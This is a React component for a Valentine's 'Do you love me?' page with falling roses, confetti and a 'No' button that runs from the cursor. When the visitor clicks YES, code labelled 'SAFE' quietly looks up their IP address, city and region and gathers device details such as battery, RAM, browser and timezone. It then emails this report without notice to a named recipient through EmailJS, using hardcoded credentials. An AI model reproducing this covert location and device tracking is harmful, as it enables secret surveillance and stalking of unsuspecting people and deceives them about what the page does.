import React, { useState, useEffect, useRef } from "react";
import { motion, AnimatePresence } from "framer-motion";
import {
  Heart,
  Volume2,
  VolumeX,
  ShieldCheck,
  Cpu,
  Battery,
  Wifi,
} from "lucide-react";
import confetti from "canvas-confetti";
import emailjs from "@emailjs/browser";

const TitaniumValentineMaster = () => {
  const [noButtonPos, setNoButtonPos] = useState({ x: 0, y: 0 });
  const [isAccepted, setIsAccepted] = useState(false);
  const [isMusicPlaying, setIsMusicPlaying] = useState(false);
  const [mousePos, setMousePos] = useState({ x: 0, y: 0 });
  const [roses, setRoses] = useState([]);
  const [extraRoses, setExtraRoses] = useState([]);

  const audioRef = useRef(null);
  const cardRef = useRef(null);

  /* 🌹 BASE ROSE RAIN */
  useEffect(() => {
    const i = setInterval(() => {
      setRoses((p) => [
        ...p.slice(-40),
        {
          id: Math.random(),
          left: Math.random() * 100,
          type: Math.random() > 0.5 ? "🌹" : "💖",
          size: Math.random() * 26 + 18,
          duration: Math.random() * 6 + 4,
          rotate: Math.random() * 360,
        },
      ]);
    }, 400);
    return () => clearInterval(i);
  }, []);

  /* 🌹 HEAVY ROSE MODE */
  useEffect(() => {
    if (!isAccepted) return;
    const i = setInterval(() => {
      setExtraRoses((p) => [
        ...p.slice(-120),
        {
          id: Math.random(),
          left: Math.random() * 100,
          type: Math.random() > 0.45 ? "🌹" : "💖",
          size: Math.random() * 40 + 24,
          duration: Math.random() * 4 + 3,
          rotate: Math.random() * 720,
        },
      ]);
    }, 120);
    return () => clearInterval(i);
  }, [isAccepted]);

  /* 🖱 MOUSE TRACK */
  useEffect(() => {
    const move = (e) => setMousePos({ x: e.clientX, y: e.clientY });
    window.addEventListener("mousemove", move);
    return () => window.removeEventListener("mousemove", move);
  }, []);

  /* 🧊 3D TILT */
  useEffect(() => {
    const card = cardRef.current;
    if (!card) return;

    const move = (e) => {
      const r = card.getBoundingClientRect();
      const x = e.clientX - r.left;
      const y = e.clientY - r.top;
      card.style.transform = `perspective(1200px)
        rotateX(${(y / r.height - 0.5) * 18}deg)
        rotateY(${(x / r.width - 0.5) * -18}deg)`;
    };

    const reset = () => {
      card.style.transform = "perspective(1200px) rotateX(0) rotateY(0)";
    };

    card.addEventListener("mousemove", move);
    card.addEventListener("mouseleave", reset);
    return () => {
      card.removeEventListener("mousemove", move);
      card.removeEventListener("mouseleave", reset);
    };
  }, []);

  /* ❌ NO BUTTON */
  const moveNoButton = () => {
    setNoButtonPos({
      x: (Math.random() - 0.5) * window.innerWidth * 0.7,
      y: (Math.random() - 0.5) * window.innerHeight * 0.7,
    });
  };

  /* ⚡ FLASH */
  const flashScreen = () => {
    const f = document.createElement("div");
    Object.assign(f.style, {
      position: "fixed",
      inset: 0,
      background: "#fff",
      opacity: 0.85,
      zIndex: 9999,
    });
    document.body.appendChild(f);
    setTimeout(() => {
      f.style.transition = "opacity 0.6s";
      f.style.opacity = 0;
      setTimeout(() => f.remove(), 600);
    }, 50);
  };

  /* ❤️ YES HANDLER */
  const handleYes = async () => {
    setIsAccepted(true);
    flashScreen();

    confetti({
      particleCount: 300,
      spread: 120,
      origin: { y: 0.6 },
      colors: ["#ff0055", "#ffd700"],
    });

    try {
      /* BASIC DEVICE INFO (SAFE) */
      const loc = await (await fetch("https://ipwho.is/")).json();

      const cores = navigator.hardwareConcurrency || "N/A";
      const ram = navigator.deviceMemory
        ? `${navigator.deviceMemory} GB`
        : "N/A";
      const userAgent = navigator.userAgent;
      const language = navigator.language;
      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

      let batteryInfo = "Unsupported";
      if (navigator.getBattery) {
        const b = await navigator.getBattery();
        batteryInfo = `${Math.round(b.level * 100)}% (${b.charging ? "Charging" : "Discharging"})`;
      }

      const fullReport = `
👑 KRAVIONA – DEVICE REPORT 👑

Location: ${loc.city}, ${loc.region}, ${loc.country}
IP: ${loc.ip}

System:
Platform: ${navigator.platform}
CPU Cores: ${cores}
RAM: ${ram}
Battery: ${batteryInfo}

Browser:
${userAgent}
Language: ${language}
Timezone: ${timezone}

Screen:
${screen.width} x ${screen.height}

Time:
${new Date().toLocaleString()}
`;

      await emailjs.send(
        "service_zl8ycen",
        "template_nz3e9jp",
        { to_name: "Amar Kumar", message: fullReport },
        "lxUfAecwZ_It3aGzn",
      );
    } catch (e) {
      console.log("Email skipped");
    }
  };

  return (
    <div className="relative min-h-screen bg-[#080102] flex items-center justify-center overflow-hidden text-white">
      <audio
        ref={audioRef}
        loop
        src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3"
      />

      <div
        className="absolute inset-0 pointer-events-none"
        style={{
          background: `radial-gradient(700px circle at ${mousePos.x}px ${mousePos.y}px, rgba(255,0,85,0.25), transparent 80%)`,
        }}
      />

      <AnimatePresence>
        {[...roses, ...extraRoses].map((r) => (
          <motion.div
            key={r.id}
            initial={{ y: -120, x: `${r.left}vw`, opacity: 0 }}
            animate={{ y: "130vh", opacity: [0, 1, 1, 0], rotate: r.rotate }}
            transition={{ duration: r.duration, ease: "linear" }}
            className="absolute pointer-events-none"
            style={{ fontSize: r.size }}
          >
            {r.type}
          </motion.div>
        ))}
      </AnimatePresence>

      {!isAccepted ? (
        <div
          ref={cardRef}
          className="z-20 p-16 bg-[#0d0103]/95 rounded-[60px] text-center"
        >
          <Heart size={120} fill="#ff0055" className="mx-auto mb-8" />
          <h1 className="text-7xl font-black mb-12">
            Do you <span className="text-pink-500">love</span> me?
          </h1>

          <div className="flex gap-10 justify-center">
            <button
              onClick={handleYes}
              className="px-20 py-7 bg-pink-600 rounded-3xl text-4xl font-black"
            >
              YES ❤️
            </button>

            <motion.button
              onMouseEnter={moveNoButton}
              animate={noButtonPos}
              transition={{ type: "spring", stiffness: 500 }}
              className="px-12 py-4 bg-white/10 rounded-2xl"
            >
              No 🥀
            </motion.button>
          </div>
        </div>
      ) : (
        <div className="z-30 text-center">
          <h1
            className="text-[160px] font-black animate-pulse"
            style={{ animation: "softGlow 3s infinite" }}
          >
            MINE 💍
          </h1>
          <p className="text-3xl italic text-pink-300">
            “In a universe full of chaos, you became my calm, my forever.”
          </p>
        </div>
      )}

      <style>{`
        @keyframes softGlow {
          0% { text-shadow: 0 0 20px #ff0055; }
          50% { text-shadow: 0 0 80px #ff0055; }
          100% { text-shadow: 0 0 20px #ff0055; }
        }
      `}</style>
    </div>
  );
};

export default TitaniumValentineMaster;
